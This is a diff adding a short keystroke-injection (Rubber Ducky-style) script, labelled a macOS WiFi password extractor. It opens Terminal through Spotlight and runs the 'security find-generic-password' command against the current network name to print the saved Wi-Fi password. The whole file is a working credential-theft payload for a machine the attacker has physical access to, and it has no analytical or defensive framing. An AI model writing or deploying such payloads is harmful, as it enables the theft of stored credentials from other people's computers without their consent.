@@ -1,0 +1,10 @@
+REM WiFi Password Extractor - macOS
+REM Author: bad-antics
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+STRING security find-generic-password -ga "$(networksetup -getairportnetwork en0 | cut -d: -f2 | tr -d ' ')" 2>&1 | grep password
+ENTER
